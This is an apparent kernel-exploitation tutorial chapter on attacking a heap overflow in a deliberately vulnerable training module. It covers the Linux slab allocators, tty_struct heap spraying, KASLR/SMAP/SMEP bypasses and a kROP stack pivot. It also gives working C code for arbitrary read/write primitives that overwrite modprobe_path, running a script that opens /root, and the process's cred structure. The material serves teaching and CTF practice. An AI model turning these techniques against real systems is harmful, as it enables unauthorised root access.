---
title: "Holstein v2: Exploiting Heap Overflow"
tags:
    - [Linux]
    - [Kernel]
    - [Heap Overflow]
    - [kROP]
    - [stack pivot]
    - [AAR]
    - [AAW]
    - [modprobe_path]
    - [core_pattern]
    - [current_task]
    - [cred]
lang: en
permalink: /en/linux-kernel/LK01/heap_overflow.html
pagination: true
bk: stack_overflow.html
fd: use_after_free.html
---
In the previous chapter, we exploited a Stack Overflow in the Holstein module and escalated privileges. The Holstein developer quickly fixed the bug and released Holstein v2. In this chapter, we exploit the improved Holstein module v2.

## Patch analysis and vulnerability survey
First, download [Holstein v2](distfiles/LK01-2.tar.gz).
If you inspect the source code in the `src` directory, you will see that compared with the previous version only `module_read` and `module_write` changed.
```c
static ssize_t module_read(struct file *file,
                           char __user *buf, size_t count,
                           loff_t *f_pos)
{
  printk(KERN_INFO "module_read called\n");

  if (copy_to_user(buf, g_buf, count)) {
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }

  return count;
}

static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  printk(KERN_INFO "module_write called\n");

  if (copy_from_user(g_buf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }

  return count;
}
```
Instead of using a stack variable, the module now reads and writes the contents of `g_buf` directly. Of course, there is still no bounds check, so an overflow remains. This time the vulnerability is a heap overflow.
`g_buf` is allocated inside `module_open`.
```c
g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
```
`BUFFER_SIZE` is `0x400`. Let's see what happens if we write more than that.
```c
int main() {
  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1)
    fatal("/dev/holstein");

  char buf[0x500];
  memset(buf, 'A', 0x500);
  write(fd, buf, 0x500);

  close(fd);
  return 0;
}
```
If you actually run this program, probably nothing obvious happens, like in the screenshot below.

<center>
  <img src="img/hbof_nothing.png" alt="Heap overflow does not immediately crash" style="width:320px;">
</center>

So how does the Linux kernel heap actually work?

## Slab allocators
Like user space, the kernel sometimes needs to allocate dynamic regions smaller than a page. The simplest allocator would be to carve out memory in page-size units like `mmap`, but that wastes too much memory.
Just as user space has `malloc`, kernel space has `kmalloc`. Internally it uses an allocator built into the kernel, usually one of SLAB, SLUB, or SLOB. These three are not completely independent and share some implementation concepts. Collectively they are called **slab allocators**. The naming is confusing because the difference between Slab and SLAB is only capitalization.

We will explain each allocator, but only the parts important for exploitation. Just like user-space allocators, the important points are:

- where chunks come from depending on the requested size
- how freed objects are managed and how they get reused by later allocations

We will look at each allocator with those two points in mind.

### SLAB allocator
The SLAB allocator is historically the oldest type. It is used mainly in systems such as Solaris.
Its main implementation lives in [/mm/slab.c](https://elixir.bootlin.com/linux/v5.15/source/mm/slab.c).

SLAB has the following characteristics:

- **Different page frames depending on size**
  Unlike libc allocators, different pages are used for different size classes. Therefore chunks do not carry size metadata immediately before or after them.
- **Cache usage**
  For small sizes, per-size caches are preferred. For large sizes or when the cache is empty, normal allocation is used instead.
- **Bitmap-based management of free regions**
  Because the page frame differs by size class, the beginning of the page contains a bit array indicating which indices inside that page are free. Unlike libc `malloc`, it is not managed by linked lists.

In short, free regions are managed per page frame by index as follows:

<center>
  <img src="img/slab_allocator.png" alt="SLAB allocator diagram" style="width:640px;">
</center>

In reality there are also some cache entries, and pointers to freed regions recorded there are used first.
In addition, depending on flags given at cache creation time through `__kmem_cache_create`, SLAB can provide features such as:

- `SLAB_POISON`: freed regions are filled with `0xA5`
- `SLAB_RED_ZONE`: a redzone is added after objects and corruption from Heap Overflow is detected

### SLUB allocator
SLUB is the allocator currently used by default and is designed for large systems. It aims to be as fast as possible.
Its main implementation lives in [/mm/slub.c](https://elixir.bootlin.com/linux/v5.15/source/mm/slub.c).

SLUB has the following characteristics:

- **Different page frames depending on size**
  Like SLAB, different page frames are used for different size classes. For example, 100-byte allocations use `kmalloc-128`, while 200-byte allocations use `kmalloc-256`. Unlike SLAB, metadata such as free-region indices is not stored at the beginning of the page frame. Pointers such as the head of the freelist are stored in the page-frame descriptor instead.
- **Forward-list management of free regions**
  Like libc's tcache and fastbin, SLUB manages free regions with a singly linked list. The beginning of a freed region stores a pointer to the previously freed region, and the link in the last freed region is NULL. There is no special protection like tcache/fastbin link checks.
- **Cache usage**
  Like SLAB, there are per-CPU caches, but in SLUB they also take the form of singly linked lists.

In short, free regions are managed like this:

<center>
  <img src="img/slub_allocator.png" alt="SLUB allocator diagram" style="width:680px;">
</center>

In SLUB, debugging features can be enabled by passing letters to the `slub_debug` kernel boot parameter.

- `F`: enable sanity checks
- `P`: fill freed regions with a specific bit pattern
- `U`: record allocation and free stack traces
- `T`: log usage of a specific slab cache
- `Z`: add a redzone after objects and detect Heap Overflow

Including this chapter, the target kernels on this site basically use SLUB. However, because all programs share the same heap, attacks that directly corrupt the freelist are usually not realistic, so this site does not cover them. Most of the techniques we learn later work on the other allocators too.

### SLOB allocator
SLOB is an allocator for embedded systems and is designed to be lightweight.
Its main implementation lives in [/mm/slob.c](https://elixir.bootlin.com/linux/v5.15/source/mm/slob.c).

SLOB has the following characteristics:

- **K&R-style allocator**
  It works like the classic style of `malloc`: it carves usable regions from the beginning without fixed size classes. When space runs out, it allocates a new page. As a result, fragmentation happens very easily.
- **Offset-based management of free regions**
  In glibc, tcache and fastbin manage free regions with lists per size. In SLOB, all freed regions are linked together regardless of size. The links are not stored as direct pointers but as the chunk size and the offset to the next free region. This information is written at the beginning of the freed region. During allocation, the list is traversed until a large enough region is found.
- **Freelists based on size**
  To reduce fragmentation, there are several lists that group freed objects by size.

So free regions are managed as a forward list of size and offset information as follows. (The arrows leaving freed regions are offsets rather than real pointers.)

<center>
  <img src="img/slob_allocator.png" alt="SLOB allocator diagram" style="width:680px;">
</center>

## Exploiting Heap Overflow
We have now learned that SLUB uses different pages for different sizes and manages freed regions through a singly linked list.

As explained in the [introduction](../introduction/introduction.html), the kernel heap is shared by all drivers and by the kernel itself. Therefore, by exploiting one vulnerable driver, we can corrupt completely different kernel objects. Because the bug here is a Heap Overflow, successful exploitation requires that some target object we want to corrupt exists immediately after the overflowing region.
If you are used to exploitation, the obvious tool here is **heap spray**. We use it for two purposes:

1. Exhaust the freelist that already exists
   If objects keep being allocated from an existing freelist, we cannot guarantee adjacency to the object we want to corrupt. So we first need to consume the freelist for the target size class.
2. Place objects next to each other
   After consuming the freelist, adjacency becomes likely, but depending on the allocator it may not be obvious whether a page is consumed from the front or the back. So we simply fill both sides of the vulnerable object with objects we want to target.

The next question is the object size. Looking again at Holstein's source code, the allocated buffer size is clearly `0x400`.
```c
#define BUFFER_SIZE 0x400
```
`0x400` corresponds to `kmalloc-1024`. (You can inspect the system's slab information through `/proc/slabinfo`.)
So the object we can corrupt should basically also be of size `0x400`. I previously wrote [an article that groups useful objects by size from the attacker's point of view](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628), so refer to that as well.[^1]

In this `kmalloc-1024` size class, the `tty_struct` looks useful. `tty_struct` is defined in [`tty.h`](https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty.h#L143) and stores TTY-related state. Its size falls into `kmalloc-1024`, so this vulnerability lets us read and write out of bounds into it. Let's look at some of its members.
```c
struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;	/* class device or NULL (e.g. ptys, serdev) */
	struct tty_driver *driver;
	const struct tty_operations *ops;
	int index;
    ...
```
Here, `tty_operations` is a function table defining operations for that TTY.
By opening `/dev/ptmx` from a program as follows, a `tty_struct` is allocated in kernel space.
```c
int ptmx = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
```
If we then call operations such as `read`, `write`, or `ioctl` on that file descriptor, function pointers from `tty_operations` are invoked.

## ROP-based exploit
Now that we have all the necessary background, let's write an exploit for privilege escalation.

### Confirming the heap overflow
First, let's use `gdb` to confirm that a heap overflow is actually happening. To confirm heap spray at the same time, we use code like the following:
```c
int main() {
  int spray[100];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // Allocate in a position surrounded by tty_struct objects
  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1)
    fatal("/dev/holstein");

  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // Heap Buffer Overflow
  char buf[0x500];
  memset(buf, 'A', 0x500);
  write(fd, buf, 0x500);

  getchar(); // pause

  close(fd);
  return 0;
}
```
As usual, disable KASLR, inspect `/proc/modules`, attach with `gdb`, and set a breakpoint around the `write` handler. Since we want to know the address of `g_buf`, we placed a breakpoint right after the following instruction.

<center>
  <img src="img/ida_holstein2_write.png" alt="Where to place the breakpoint" style="width:320px;">
</center>

If we inspect the buffer and surrounding memory at that breakpoint, we see a number of similar-looking objects nearby:

<center>
  <img src="img/gdb_spray.png" alt="Checking heap spray in gdb" style="width:640px;">
</center>

These are exactly the sprayed `tty_struct` objects. This time we will gain privileges by corrupting one of them through the heap buffer overflow. After the overflow occurs, we can see that the `tty_struct` immediately after `g_buf` has indeed been corrupted.

<center>
  <img src="img/gdb_tty_bof.png" alt="Corrupting tty_struct" style="width:640px;">
</center>

### Defeating KASLR
In Holstein v1 we bypassed one mitigation at a time, but this time let's bypass all of them at once: KASLR, SMAP, SMEP, and KPTI. (Of course, for debugging you should still disable KASLR.)

This heap buffer overflow is not just a write primitive but also a read primitive, so by reading `tty_struct` we can defeat KASLR. For example, in the figure above, the pointer at offset `0x18` from the beginning, namely `ops`, is clearly a kernel address, so we can compute the base address from it.
```c
#define ofs_tty_ops 0xc38880
unsigned long kbase;
...
  // Defeat KASLR
  char buf[0x500];
  read(fd, buf, 0x500);
  kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
  printf("[+] kbase = 0x%016lx\n", kbase);
```

### Defeating SMAP: controlling RIP
Once we know the kernel base address, it looks as if we should be able to control RIP simply by overwriting the `ops` function table. In practice, it is not that straightforward. `ops` is not itself a function pointer but a pointer to a function table, so to control RIP we need it to point to a fake function table.
If SMAP were disabled, we could prepare that fake table in user space and just write its pointer into `ops`. But SMAP is enabled here, so the kernel cannot dereference user-space data.

So how do we bypass SMAP?
The only place where we can write controlled data in kernel space is the heap, so we need a heap address leak. If we inspect `tty_struct` in `gdb`, we can see several pointers that look like heap addresses.

<center>
  <img src="img/gdb_tty_struct.png" alt="Inside tty_struct" style="width:640px;">
</center>

In particular, the pointer around offset `0x38` points right into that `tty_struct` itself.[^2] From it we can compute the address of the `tty_struct`, and subtracting `0x400` gives the address of `g_buf`. Since the contents of `g_buf` are fully controllable, we can place the fake `ops` table there and then overwrite `ops` via the heap overflow.
Once a `tty_struct` has been overwritten, any suitable operation on it can give us control of RIP. We do not know which of the sprayed `tty_struct` objects got corrupted, so we perform the operation on all sprayed file descriptors. We also do not know which entry in the function table will be invoked, so we first fill a fake table with marker values and then identify the called entry from the crash message.
```c
  // Leak g_buf
  g_buf = *(unsigned long*)&buf[0x438] - 0x438;
  printf("[+] g_buf = 0x%016lx\n", g_buf);

  // Write a fake function table
  unsigned long *p = (unsigned long*)&buf;
  for (int i = 0; i < 0x40; i++) {
    *p++ = 0xffffffffdead0000 + (i << 8);
  }
  *(unsigned long*)&buf[0x418] = g_buf;
  write(fd, buf, 0x420);

  // Control RIP
  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
  }
```
If RIP lands as follows, then we have succeeded:

<center>
  <img src="img/crash_ioctl.png" alt="RIP control through tty_struct overwrite" style="width:720px;">
</center>

In this case we used `ioctl`, and since the crash happened at `0xffffffffdead0c00`, we also learn that the function pointer used for `ioctl` is the 12th entry (`0xC`).

### Defeating SMEP: stack pivot
As in the Stack Overflow chapter, once RIP is under control, we can use ROP to bypass SMEP. If SMEP were absent, plain `ret2usr` would be enough, but to bypass SMEP itself, a gadget such as the following is sufficient:
```
0xffffffff81516264: mov esp, 0x39000000; ret;
```
If we `mmap` user-space memory at `0x39000000` in advance and place a ROP chain there, invoking this gadget makes execution pivot to that chain.
However, SMAP is enabled this time, so a ROP chain placed in user space cannot be executed. Fortunately, we already know the address of a writable kernel-space area, the heap, so we can place the fake function table and the ROP chain together on the heap and execute it there.

To execute a heap-based ROP chain, we need to move the stack pointer `rsp` to a heap address. Earlier we used:
```c
ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
```
Looking again at the crash message from that call, we can see that some of the `ioctl` arguments appear in registers:
```
RCX: 00000000deadbeef
RDX: 00000000cafebabe
RSI: 00000000deadbeef
R08: 00000000cafebabe
R12: 00000000deadbeef
R14: 00000000cafebabe
```
That means if we pass the address of the ROP chain as an `ioctl` argument and invoke a gadget like `mov rsp, rcx; ret;`, we can begin ROP.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="Wolf" ></div>
  <p class="says">
    Arguments to <code>write</code> and <code>read</code> are often not useful for a stack pivot into the kernel heap, because the buffer pointer may be checked to ensure it lies in userland, or the handler may not be called when the size is too large.
  </p>
</div>

Even in the kernel, a simple gadget like `mov rsp, rcx; ret;` is hard to find, but gadgets of the form `push rcx; ...; pop rsp; ...; ret;` are much more likely to exist. This time we use the following gadget:
```
0xffffffff813a478a: push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;
```
First, let's just confirm that we can reach the ROP chain. In the example below, a crash at `0xffffffffdeadbeef` inside the ROP chain means success.
```c
  // Write a fake function table
  unsigned long *p = (unsigned long*)&buf;
  p[12] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;
  *(unsigned long*)&buf[0x418] = g_buf;

  // Prepare the ROP chain
  p[0] = 0xffffffffdeadbeef;

  // Heap Buffer Overflow
  write(fd, buf, 0x420);

  // Control RIP
  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], 0xdeadbeef, g_buf - 0x10); // subtract space for r13 and rbp
  }
```

### Privilege escalation
At this point, all that remains is to write the actual ROP chain. Since `p[12]` is already occupied by the function pointer used to gain RIP control, either skip that slot with a `pop` gadget or place the function table after `ops` and use `g_buf` only for the ROP chain. Either approach is fine.

Try writing the ROP chain in whatever style you prefer. If the ROP works correctly, privilege escalation should succeed even with KASLR, SMAP, SMEP, and KPTI all enabled.
An example exploit can be downloaded [here](exploit/heapbof-krop.c).

<center>
  <img src="img/hbof_privesc.png" alt="Successful privilege escalation" style="width:320px;">
</center>

## Exploiting with AAR/AAW
In the example above, we used the stack-pivot gadget `push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;`. If you searched for gadgets yourself, you probably also found only fairly complicated ones. There is no guarantee that a single RIP-control primitive will always give you a usable stack pivot. So what should we do if we cannot pivot the stack?

Even in that situation, there is a [technique](https://pr0cf5.github.io/ctf/2020/03/09/the-plight-of-tty-in-the-linux-kernel.html) that builds a stable exploit using gadgets that exist with high probability. Let's again inspect the registers when RIP is controlled:
```
ioctl(spray[i], 0xdeadbeef, 0xcafebabe);

RCX: 00000000deadbeef
RDX: 00000000cafebabe
RSI: 00000000deadbeef
R08: 00000000cafebabe
R12: 00000000deadbeef
R14: 00000000cafebabe
```
Because we control RIP by overwriting a function pointer, in other words through a `call`, execution returns cleanly to user space as long as we jump to an instruction sequence that ends in `ret`. So what can we do with a gadget like this?
```
0xffffffff810477f7: mov [rdx], rcx; ret;
```
Since both `rdx` and `rcx` are controlled, invoking this gadget lets us write an arbitrary 4-byte value to an arbitrary address. Gadgets of this `mov` form exist with fairly high probability. In other words, if you can control RIP through a function pointer, you can build an AAW primitive.
Now consider the following gadget:
```
0xffffffff8118a285: mov eax, [rdx]; ret;
```
In this case, the 4-byte value stored at an arbitrary address becomes the return value of `ioctl`. (`ioctl` returns `int`, so we can read up to 4 bytes at a time.) That gives us an AAR primitive as well.

So what can we do with arbitrary read/write in kernel space?

### `modprobe_path` and `core_pattern`
Sometimes the Linux kernel wants to launch a user-space program in response to some kernel-side event. For that purpose, it uses a function called [`call_usermodehelper`](https://elixir.bootlin.com/linux/v5.15/source/kernel/umh.c#L474). There are several paths that use `call_usermodehelper`, but two especially useful ones that unprivileged user space can reach are `modprobe_path` and `core_pattern`.

[`modprobe_path`](https://elixir.bootlin.com/linux/v5.15/source/kernel/kmod.c#L61) is the command string used from [`__request_module`](https://elixir.bootlin.com/linux/v5.15/source/kernel/kmod.c#L170), and it lives in writable memory.
Linux supports several executable formats. When an executable file is run, the kernel inspects its header bytes and decides how to handle it. By default, ELF files and shebang scripts are recognized. When the kernel encounters an executable file format that does not match any registered handler, `__request_module` is called. `modprobe_path` normally contains `/sbin/modprobe`, and if we overwrite it and then attempt to execute an invalid-format file, we can make the kernel run any command we want.

Similarly, another kernel-triggered command string is [`core_pattern`](https://elixir.bootlin.com/linux/v5.15/source/fs/coredump.c#L57). It is the command string used by [`do_coredump`](https://elixir.bootlin.com/linux/v5.15/source/fs/coredump.c#L577) when a user-space program crashes. More precisely, if `core_pattern` begins with the pipe character `|`, the command following it is executed. For example, on Ubuntu 20.04 the default is:
```
|/usr/share/apport/apport %p %s %c %d %P %E
```
If no external command is configured, the string is simply `core`, which becomes the name of the core dump file. If we overwrite `core_pattern` with AAW, then when a user-space program crashes, the kernel will launch an external program with privileges. That means we can trigger privilege escalation simply by intentionally crashing a process.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_normal.png" alt="Wolf" ></div>
  <p class="says">
    The addresses of variables are not affected by FGKASLR, so this still looks usable even when FGKASLR is enabled.
  </p>
</div>

This time, let's escalate privileges by overwriting `modprobe_path`. First we need to find its address. If symbol information is available, you can use `kallsyms` or similar tools. In this kernel, the symbols are stripped, so we have to identify it ourselves. The same applies to `core_pattern`, and in practice the easiest method is to search the string inside `vmlinux`.[^3]
```
$ python
>>> from ptrlib import ELF
>>> kernel = ELF("./vmlinux")
>>> hex(next(kernel.search("/sbin/modprobe\0")))
0xffffffff81e38180
```
If we confirm that in `gdb`, we can indeed see `/sbin/modprobe` there.
```
pwndbg> x/1s 0xffffffff81e38180
0xffffffff81e38180:     "/sbin/modprobe"
```
Now that we know the address, let's overwrite it with AAW. When you have stable AAR/AAW, it is convenient to design the exploit so they can be called like helper functions.
```c
void AAW32(unsigned long addr, unsigned int val) {
  unsigned long *p = (unsigned long*)&buf;
  p[12] = rop_mov_prdx_rcx;
  *(unsigned long*)&buf[0x418] = g_buf;
  write(fd, buf, 0x420);

  // mov [rdx], rcx; ret;
  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], val /* rcx */, addr /* rdx */);
  }
}
...
  char cmd[] = "/tmp/evil.sh";
  for (int i = 0; i < sizeof(cmd); i += 4) {
    AAW32(addr_modprobe_path + i, *(unsigned int*)&cmd[i]);
  }
```
In this example, when the kernel tries to execute an unknown-format file, it ends up invoking `/tmp/evil.sh`. Therefore we place whatever action we want inside `/tmp/evil.sh`. Here we use the following script:
```sh
#!/bin/sh
chmod -R 777 /root
```
Finally, create any invalid executable file and run it:
```c
  system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
  system("chmod +x /tmp/evil.sh");
  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
  system("chmod +x /tmp/pwn");
  system("/tmp/pwn"); // trigger modprobe_path
```
If the exploit succeeds, an arbitrary command runs with root privileges.

<center>
  <img src="img/hbof_modprobe_path.png" alt="Privilege escalation via modprobe_path" style="width:400px;">
</center>

This exploit can be downloaded [here](exploit/heapbof-aaw.c).

### `cred` structures
As explained in the [previous chapter](stack_overflow.html), a process's privileges are managed by the `cred` structure. Since it stores things such as the effective user ID of the process, we can escalate privileges by rewriting the ID fields of our own process's `cred` to root (`0`). But how do we obtain the address of our process's `cred`?

On older Linux kernels there used to be a global symbol called `current_task`, which pointed to the `task_struct` of the current process context. So if you had AAR/AAW, you could walk from `task_struct` to `cred` and escalate privileges easily.
In more recent kernels, however, `current_task` is no longer a global variable. Instead it is stored in per-CPU storage and accessed through the `gs` register. That means we cannot directly locate the process's `cred`, but if we already have AAR, it is still relatively easy. The kernel heap is not that huge, so in kernel exploitation it is feasible to scan the heap and locate the `cred` structure. Since we already know a heap address in this exploit, that is possible here. In other words, privilege escalation can be done with code like this. (This time `ioctl` returns up to 4 bytes at a time, so we scan 4 bytes at a time.)
```c
for (u64 p = heap_address; ; p += 4) {
  u32 leak = AAR_32bit(p); // AAR
  if (looks_like_cred(leak)) { // looks like a cred structure
    memcpy(p + XXX, 0, YYY); // rewrite effective UID
  }
}
```
The question is how to find our own process's `cred`. For that, let's look again at the members of [**`task_struct`**](https://elixir.bootlin.com/linux/v5.15/source/include/linux/sched.h#L723).
```c
struct task_struct {
    ...
	/* Process credentials: */

	/* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;

	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;

#ifdef CONFIG_KEYS
	/* Cached requested key. */
	struct key			*cached_requested_key;
#endif

	/*
	 * executable name, excluding path.
	 *
	 * - normally initialized setup_new_exec()
	 * - access it with [gs]et_task_comm()
	 * - lock it with task_lock()
	 */
	char				comm[TASK_COMM_LEN];

    ...
}
```
The important field here is `comm`. It stores up to 16 bytes of the process's executable name. This value can be changed with the `PR_SET_NAME` option of `prctl`.
```
PR_SET_NAME (since Linux 2.6.9)
    Set  the name of the calling thread, using the value in the location pointed to by (char *) arg2.  The name can be up to 16 bytes long, including the terminating null byte.  (If the
    length of the string, including the terminating null byte, exceeds 16 bytes, the string is silently truncated.)  This is the same attribute that can be set via pthread_setname_np(3)
    and retrieved using pthread_getname_np(3).  The attribute is likewise accessible via /proc/self/task/[tid]/comm, where tid is the name of the calling thread.
```
So we can set `comm` to a string unlikely to appear elsewhere in the kernel and then search for it with AAR. Looking at the `task_struct` definition, there is a pointer to `cred` right before `comm`, so once we find `comm` we can rewrite our own privilege information.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="Wolf" ></div>
  <p class="says">
    This method is convenient when you want a stable exploit across many environments, because if you have AAR/AAW, it does not depend on ROP gadgets or function offsets.
  </p>
</div>

Now that we understand the idea, let's actually implement privilege escalation this way. A naive AAR implementation is fine, but in this exploit we call it many times, so trying every sprayed `tty_struct` on every read is too slow. The author therefore caches the correct file descriptor on the first call. Also, since the `write` that installs the ROP gadget only needs to happen once, skipping it on subsequent calls speeds the exploit up significantly.
```c
int cache_fd = -1;

unsigned int AAR32(unsigned long addr) {
  if (cache_fd == -1) {
    unsigned long *p = (unsigned long*)&buf;
    p[12] = rop_mov_eax_prdx;
    *(unsigned long*)&buf[0x418] = g_buf;
    write(fd, buf, 0x420);
  }

  // mov eax, [rdx]; ret;
  if (cache_fd == -1) {
    for (int i = 0; i < 100; i++) {
      int v = ioctl(spray[i], 0, addr /* rdx */);
      if (v != -1) {
        cache_fd = spray[i];
        return v;
      }
    }
  } else {
    return ioctl(cache_fd, 0, addr /* rdx */);
  }
}
```
Next, because we do not know where `task_struct` resides on the heap, we search from a point well before the address of `g_buf`. The author found it about `0x200000` bytes earlier in `gdb`, but that depends on the environment and heap state, so we search with a generous range.
```c
  // Search for task_struct
  if (prctl(PR_SET_NAME, "nekomaru") != 0)
    fatal("prctl");
  unsigned long addr;
  for (addr = g_buf - 0x1000000; ; addr += 0x8) {
    if ((addr & 0xfffff) == 0)
      printf("searching... 0x%016lx\n", addr);

    if (AAR32(addr) == 0x6f6b656e
        && AAR32(addr+4) == 0x7572616d) {
      printf("[+] Found 'comm' at 0x%016lx\n", addr);
      break;
    }
  }
```
Once we know where `comm` is, we can overwrite the adjacent `cred`.
```c
  unsigned long addr_cred = 0;
  addr_cred |= AAR32(addr - 8);
  addr_cred |= (unsigned long)AAR32(addr - 4) << 32;
  printf("[+] current->cred = 0x%016lx\n", addr_cred);

  // Overwrite effective IDs
  for (int i = 1; i < 9; i++) {
    AAW32(addr_cred + i*4, 0); // id=0(root)
  }

  puts("[+] pwned!");
  system("/bin/sh");
```
If privilege escalation succeeds as shown below, then the exploit worked.

<center>
  <img src="img/hbof_cred.png" alt="Privilege escalation by overwriting cred" style="width:400px;">
</center>

In this chapter, we learned how to exploit Heap Overflow vulnerabilities in kernel space. In fact, at this point we already know enough to attack most vulnerabilities. The next chapter handles Use-after-Free in kernel space, but most vulnerabilities eventually reduce to kROP or AAR/AAW anyway, so the overall exploitation pattern stays almost the same.

[^1]: Be careful, because object sizes may differ depending on the kernel version.
[^2]: This is part of a doubly linked list used by Linux. Since many kernel objects contain such links, for example through mutex-related structures, they are useful for leaking heap addresses.
[^3]: Another way is to disassemble functions that use the variable and recover the address from there.

----

<div class="column" title="Exercise">
  In this chapter, we overwrote <code>modprobe_path</code> to execute a command as root.<br>
  (1) Overwrite <code>core_pattern</code> and gain root in the same way.<br>
  (2) Functions such as <code>orderly_poweroff</code> and <code>orderly_reboot</code> execute commands stored in <code>poweroff_cmd</code> and <code>reboot_cmd</code> respectively, as shown <a href="https://elixir.bootlin.com/linux/v5.15/source/kernel/reboot.c#L462">here</a>. Overwrite one of those command strings and then call the corresponding function through RIP control to spawn a root shell.<br>
</div>
